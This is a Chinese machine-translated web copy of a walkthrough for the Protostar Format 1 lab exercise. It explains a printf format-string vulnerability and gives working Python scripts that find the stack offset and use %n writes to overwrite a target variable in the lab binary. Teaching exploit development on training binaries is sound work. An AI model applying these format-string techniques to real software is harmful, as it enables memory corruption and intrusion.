<html>
<head>
<title>[ExpDev] Exploit Exercise | Protostar | Format 1</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">[ExpDev]漏洞利用练习|原恒星|格式1</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/expdev-exploit-exercise-protostar-format-1-c5182332a69a?source=collection_archive---------1-----------------------#2020-05-27">https://infosecwriteups.com/expdev-exploit-exercise-protostar-format-1-c5182332a69a?source=collection_archive---------1-----------------------#2020-05-27</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><figure class="gl gn jr js jt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi jq"><img src="../Images/2a432b83c5226c3a04d2aa12d4fdcc01.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*Sr48dNDdoxCvweh_.png"/></div></div></figure><h1 id="885a" class="kb kc it bd kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky bi translated">格式1(格式字符串基本1)</h1><p id="9ea9" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">这个挑战的目标是利用格式字符串来修改任意内存位置，以打印获胜的语句。</p><ul class=""><li id="2d33" class="lx ly it lb b lc lz lg ma lk mb lo mc ls md lw me mf mg mh bi translated">链接:<a class="ae mi" href="https://exploit-exercises.lains.space/protostar/format1/" rel="noopener ugc nofollow" target="_blank">https://exploit-exercises.lains.space/protostar/format1/</a></li></ul><figure class="mk ml mm mn gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi mj"><img src="../Images/9697c9c14f4a0100e98a3bf9b4b34fc7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*loy5LJXxyYWV86f_wuOyrA.png"/></div></div></figure><h2 id="9834" class="mo kc it bd kd mp mq dn kh mr ms dp kl lk mt mu kp lo mv mw kt ls mx my kx mz bi translated">注意事项</h2><ul class=""><li id="66e6" class="lx ly it lb b lc ld lg lh lk na lo nb ls nc lw me mf mg mh bi translated"><code class="fe nd ne nf ng b"><strong class="lb iu">printf(string);</strong></code>:这是这段代码中易受攻击的函数。<code class="fe nd ne nf ng b">printf()</code>将<em class="nh">而不是</em>检查所提供的输入是否是预期的格式字符串，因为它被编码为接受任何字符串值。所以我们能做的只是简单地验证我们是否可以泄漏内存地址，并且也可以将任意代码写到堆栈上(<strong class="lb iu">【读取】</strong> <code class="fe nd ne nf ng b">%p</code> → <strong class="lb iu">【写入】</strong> <code class="fe nd ne nf ng b">%n</code>)。</li><li id="2b73" class="lx ly it lb b lc ni lg nj lk nk lo nl ls nm lw me mf mg mh bi translated"><code class="fe nd ne nf ng b"><strong class="lb iu">if(target) {</strong></code>:这个<code class="fe nd ne nf ng b">target</code>变量就是我们需要找到的。然后，通过利用格式字符串漏洞，我们将把地址写入堆栈，通过指定正确的偏移值来打印出获胜的语句。</li></ul></div><div class="ab cl nn no hx np" role="separator"><span class="nq bw bk nr ns nt"/><span class="nq bw bk nr ns nt"/><span class="nq bw bk nr ns"/></div><div class="im in io ip iq"><h1 id="5c58" class="kb kc it bd kd ke nu kg kh ki nv kk kl km nw ko kp kq nx ks kt ku ny kw kx ky bi translated">拆解(GDB)</h1><p id="54f8" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">让我们反汇编二进制文件，看看在ASM级别做了什么:</p><pre class="mk ml mm mn gt nz ng oa ob aw oc bi"><span id="e3d8" class="mo kc it ng b gy od oe l of og"><strong class="ng iu">$ gdb -q format1</strong><br/>Reading symbols from /opt/protostar/bin/format1...done.<br/><strong class="ng iu">(gdb) set disassembly-flavor intel<br/>(gdb) disassemble vuln</strong></span></pre><figure class="mk ml mm mn gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi oh"><img src="../Images/4da814aeb1b0680486bc7d3d3d9861ae.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*tOJhV9RTNnz3nEp2WA2PXw.png"/></div></div></figure><p id="2805" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk oi lm ln lo oj lq lr ls ok lu lv lw im bi translated">这个程序非常简单。有趣的是，<code class="fe nd ne nf ng b">mov eax,ds:0x8049638</code>将下面的地址从<code class="fe nd ne nf ng b">.bss</code>(T8段的一部分)移到<code class="fe nd ne nf ng b">EAX</code>寄存器中。</p><p id="31f1" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk oi lm ln lo oj lq lr ls ok lu lv lw im bi translated">下面是使用<code class="fe nd ne nf ng b">objdump</code>转储二进制文件的头:</p><pre class="mk ml mm mn gt nz ng oa ob aw oc bi"><span id="30b3" class="mo kc it ng b gy od oe l of og"><strong class="ng iu">$ objdump -h /opt/protostar/bin/format1</strong><br/>...(snip)...</span><span id="ed5f" class="mo kc it ng b gy ol oe l of og"><strong class="ng iu">23 .data</strong>         00000008  <strong class="ng iu">08049628  08049628</strong>  00000628  2**2<br/>                  CONTENTS, ALLOC, LOAD, DATA<br/><strong class="ng iu">24 .bss</strong>          0000000c  <strong class="ng iu">08049630  08049630</strong>  00000630  2**2<br/>                  ALLOC<br/>...(snip)...</span></pre><p id="fa00" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk oi lm ln lo oj lq lr ls ok lu lv lw im bi translated">然后，如果<code class="fe nd ne nf ng b">EAX</code>等于“0”，则<code class="fe nd ne nf ng b">test eax,eax</code>通过将<code class="fe nd ne nf ng b">eflags</code>值设置为<code class="fe nd ne nf ng b">ZF</code>(=零标志)来创建条件跳转如果为“0”，则跳转；否则，它继续其执行流程。</p></div><div class="ab cl nn no hx np" role="separator"><span class="nq bw bk nr ns nt"/><span class="nq bw bk nr ns nt"/><span class="nq bw bk nr ns"/></div><div class="im in io ip iq"><h1 id="1ffe" class="kb kc it bd kd ke nu kg kh ki nv kk kl km nw ko kp kq nx ks kt ku ny kw kx ky bi translated">剥削</h1><h2 id="8ce5" class="mo kc it bd kd mp mq dn kh mr ms dp kl lk mt mu kp lo mv mw kt ls mx my kx mz bi translated">初步侦察</h2><p id="acac" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">如前所述，易受攻击的函数是<code class="fe nd ne nf ng b">printf(string)</code>。当我们提供一个随机字符串时，它只是回显:</p><figure class="mk ml mm mn gt ju gh gi paragraph-image"><div class="gh gi om"><img src="../Images/f75057f3c1877308497d7e5dcb2d7f97.png" data-original-src="https://miro.medium.com/v2/resize:fit:1100/format:webp/1*945sPZ1QqL_MIiO6rhhnMw.png"/></div></figure><p id="a0e1" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk oi lm ln lo oj lq lr ls ok lu lv lw im bi translated">然而，如果我们提供一些格式字符串参数，我们会得到有趣的输出😮：</p><figure class="mk ml mm mn gt ju gh gi paragraph-image"><div class="gh gi on"><img src="../Images/01c844061062848387f2e0a040ba2648.png" data-original-src="https://miro.medium.com/v2/resize:fit:1230/format:webp/1*1WUWvULE0T_UzDVSBXz3nQ.png"/></div></figure><p id="e4e6" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk oi lm ln lo oj lq lr ls ok lu lv lw im bi translated">这基本上是在堆栈内存中打印出一些随机地址。但更有趣的是，如果我们输入足够多的格式字符串参数，我们实际上可以在堆栈中找到我们输入的字符串。</p><pre class="mk ml mm mn gt nz ng oa ob aw oc bi"><span id="d3d6" class="mo kc it ng b gy od oe l of og"><strong class="ng iu">$ ./format1 $(python -c 'print "AAAA" + "%p|" * 156') &amp;&amp; echo</strong></span></pre><figure class="mk ml mm mn gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi oo"><img src="../Images/29ceea509ebdaf3e90da8ddc02d7818b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1zid95cl4BqEx6_xYoULlA.png"/></div></div></figure><p id="95ba" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk oi lm ln lo oj lq lr ls ok lu lv lw im bi translated">滥用这一点:(1)找到一个我们可以控制的偏移量→ (2)编写一个我们希望执行的任意代码。在这种情况下，我们将只为<code class="fe nd ne nf ng b">target</code>变量提供一个地址来打印获胜的语句。</p><h2 id="ce1c" class="mo kc it bd kd mp mq dn kh mr ms dp kl lk mt mu kp lo mv mw kt ls mx my kx mz bi translated">寻找偏移</h2><p id="c280" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">让我们编写一个快速的python脚本来查找偏移值:</p><pre class="mk ml mm mn gt nz ng oa ob aw oc bi"><span id="2b2a" class="mo kc it ng b gy od oe l of og"><strong class="ng iu">[exploit.py] - Finding Offset</strong></span><span id="a12f" class="mo kc it ng b gy ol oe l of og">#!/usr/bin/python</span><span id="2341" class="mo kc it ng b gy ol oe l of og">import os</span><span id="52ad" class="mo kc it ng b gy ol oe l of og">egg = "AAAA"</span><span id="4ce2" class="mo kc it ng b gy ol oe l of og">def desc():<br/>  print('[+] Running Simple Format String Spraying...')<br/>  print('[+] Setting Egg: {0}').format(egg.encode("hex"))</span><span id="f151" class="mo kc it ng b gy ol oe l of og">def spraying():<br/>  i = 1<br/>  while i &lt; 200:<br/>    c = int(i)<br/>    p = '/opt/protostar/bin/format1 ' + egg + ("%p" * c) + "%p"<br/>    out = os.popen(p).read()<br/>    s = str(out)<br/>  <br/>    if egg.encode("hex") in s:<br/>      print('[+] Egg found! ...{0}'.format(out[-30:]))<br/>      print('[+] Found Offset: {0}'.format(i))<br/>      break  <br/>    else:<br/>      i += 1<br/>      continue</span><span id="e0f4" class="mo kc it ng b gy ol oe l of og">if __name__ == "__main__":<br/>  desc()<br/>  spraying()</span></pre><p id="a059" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk oi lm ln lo oj lq lr ls ok lu lv lw im bi translated">这个脚本应该是不言自明的。当我们运行这个脚本时，我们得到132的偏移量。</p><figure class="mk ml mm mn gt ju gh gi paragraph-image"><div class="gh gi op"><img src="../Images/6d31e4d251f83b9976e68891b7871260.png" data-original-src="https://miro.medium.com/v2/resize:fit:926/format:webp/1*nbeo7NDzFwPVg4xIz0sUmg.png"/></div></figure><h2 id="c6ea" class="mo kc it bd kd mp mq dn kh mr ms dp kl lk mt mu kp lo mv mw kt ls mx my kx mz bi translated">寻找“目标”变量地址</h2><pre class="mk ml mm mn gt nz ng oa ob aw oc bi"><span id="af25" class="mo kc it ng b gy od oe l of og"><strong class="ng iu">$ objdump -t format1 |grep target</strong><br/><strong class="ng iu">08049638</strong> g     O .bss <strong class="ng iu">00000004</strong>              target</span></pre><p id="0959" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk oi lm ln lo oj lq lr ls ok lu lv lw im bi translated"><code class="fe nd ne nf ng b">target</code>的地址存在于<code class="fe nd ne nf ng b">0x08049638</code>中。将地址转换成小端格式= <code class="fe nd ne nf ng b">\x38\x96\x04\x08</code>。</p></div><div class="ab cl nn no hx np" role="separator"><span class="nq bw bk nr ns nt"/><span class="nq bw bk nr ns nt"/><span class="nq bw bk nr ns"/></div><div class="im in io ip iq"><h2 id="4e50" class="mo kc it bd kd mp mq dn kh mr ms dp kl lk mt mu kp lo mv mw kt ls mx my kx mz bi translated">最终利用</h2><pre class="mk ml mm mn gt nz ng oa ob aw oc bi"><span id="51c3" class="mo kc it ng b gy od oe l of og"><strong class="ng iu">[exploit.py] - Final Exploit</strong></span><span id="4176" class="mo kc it ng b gy ol oe l of og">#!/usr/bin/python</span><span id="8318" class="mo kc it ng b gy ol oe l of og">import os</span><span id="1b56" class="mo kc it ng b gy ol oe l of og">egg = "\x38\x96\x04\x08"    <strong class="ng iu">&lt;-- Little-endian Formatted "target" </strong></span><span id="d2d3" class="mo kc it ng b gy ol oe l of og">def desc():<br/>  print('[+] Running Simple Format String Spraying...')<br/>  print('[+] Setting Egg: {0}').format(egg.encode("hex"))</span><span id="c03b" class="mo kc it ng b gy ol oe l of og">def spraying():<br/>  i = 1<br/>  while i &lt; 200:<br/>    c = int(i)<br/>    p = '/opt/protostar/bin/format1 ' + egg + ("%p" * c) + "%p"<br/>    out = os.popen(p).read()<br/>    s = str(out)<br/>     <br/>    if egg.encode("hex") in s:<br/>      print('[+] Egg found! ...{0}'.format(out[-30:]))<br/>      print('[+] Found Offset: {0}'.format(i))<br/>      break  <br/>    else:<br/>      i += 1<br/>      continue</span><span id="31e4" class="mo kc it ng b gy ol oe l of og">def win():<br/>  <strong class="ng iu">offset = int(132)    &lt;-- Found Offset Value</strong><br/>  p = '/opt/protostar/bin/format1 ' <br/>  p+= egg <br/>  p+= ("%p" * offset) <br/>  p+= "%n"    <strong class="ng iu">&lt;-- Write the number of char into pointers</strong><br/>  out = os.popen(p).read()<br/>  s = str(out)</span><span id="f621" class="mo kc it ng b gy ol oe l of og">if "target" in s:<br/>    print('[+] Winning Statement: {0}'.format(out[-32:]))<br/>    exit(0) <br/>  else:<br/>    print('[-] Something Went Wrong...')<br/>    exit(1)</span><span id="f9c8" class="mo kc it ng b gy ol oe l of og">if __name__ == "__main__":<br/>  desc()<br/>  #spraying()<br/>  win()</span></pre><p id="5f64" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk oi lm ln lo oj lq lr ls ok lu lv lw im bi translated">当我们运行脚本时，我们得到了漂亮的获胜语句:</p><figure class="mk ml mm mn gt ju gh gi paragraph-image"><div class="gh gi oq"><img src="../Images/6539b1e60bdd3f2881991c135c6f23e2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1074/format:webp/1*Ylb3DSfAudSB36TDz2MaVg.png"/></div></figure><p id="a958" class="pw-post-body-paragraph kz la it lb b lc lz le lf lg ma li lj lk oi lm ln lo oj lq lr ls ok lu lv lw im bi translated">感谢阅读！</p><h2 id="da63" class="mo kc it bd kd mp mq dn kh mr ms dp kl lk mt mu kp lo mv mw kt ls mx my kx mz bi translated">下一个挑战:</h2><ul class=""><li id="3d56" class="lx ly it lb b lc ld lg lh lk na lo nb ls nc lw me mf mg mh bi translated"><a class="ae mi" href="https://medium.com/@bigb0ss/expdev-exploit-exercise-protostar-format-2-73ef08011a8c" rel="noopener"> <strong class="lb iu">格式2 </strong> </a> <strong class="lb iu"> </strong> —格式字符串利用:基本2</li></ul><figure class="mk ml mm mn gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi or"><img src="../Images/cf0c368a1f7bafcde7b9cad76701a658.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*DerOnFdlDG7ZbfEb.png"/></div></div></figure></div></div>    
</body>
</html>